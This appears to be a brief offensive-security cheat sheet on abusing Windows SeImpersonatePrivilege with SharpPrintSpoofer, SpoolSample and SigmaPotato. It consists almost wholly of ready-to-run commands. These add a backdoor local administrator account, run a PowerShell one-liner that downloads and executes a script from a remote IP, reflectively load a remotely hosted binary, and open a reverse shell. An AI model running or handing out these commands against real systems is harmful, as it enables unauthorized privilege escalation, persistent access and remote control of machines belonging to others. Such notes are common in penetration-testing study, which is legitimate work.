# Leveraging SeImpersonatePrivilege

## Method 1

- We can exploit it using the two tools: `SpoolSample.exe` and `SharpPrintSpoofer.exe`.
- My recommendation will be just to create a new local administrator: 
```
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net user amit Password123! /add"
.\SharpPrintSpoofer.exe \\.\pipe\test\pipe\spoolss "net localgroup administrators amit /add"
```

Once SharpPrintSpoofer is listening, trigger the pipe with SpoolSample:
- `.\SpoolSample.exe <hostname> <hostname>/pipe/test`

## Method 2 - two in one
*Note: The SpoolSampleModified including already the functionality of `SharpPrintSpoofer.exe`, thus this one binary can handle the privielge escalation.*

Transfer to victim and run:
- `SpoolSampleModified.exe <hostname> <hostname>/pipe/test "C:\Windows\System32\cmd.exe /c powershell iex(iwr http://192.168.45.195/hollow.ps1 -useb)"`

## Method 3 - .NET Reflection with SigmaPotato

Load from a Remotely Hosted Binary via a WebClient:
```powershell
$WebClient = New-Object System.Net.WebClient
$DownloadData = $WebClient.DownloadData("http(s)://<ip_addr>/SigmaPotato.exe")
[System.Reflection.Assembly]::Load($DownloadData)
# Execute Command
[SigmaPotato]::Main("<command>")
# Establish a PowerShell Reverse Shell (one-liner)
[SigmaPotato]::Main(@("--revshell","<ip_address>","<port>"))
```
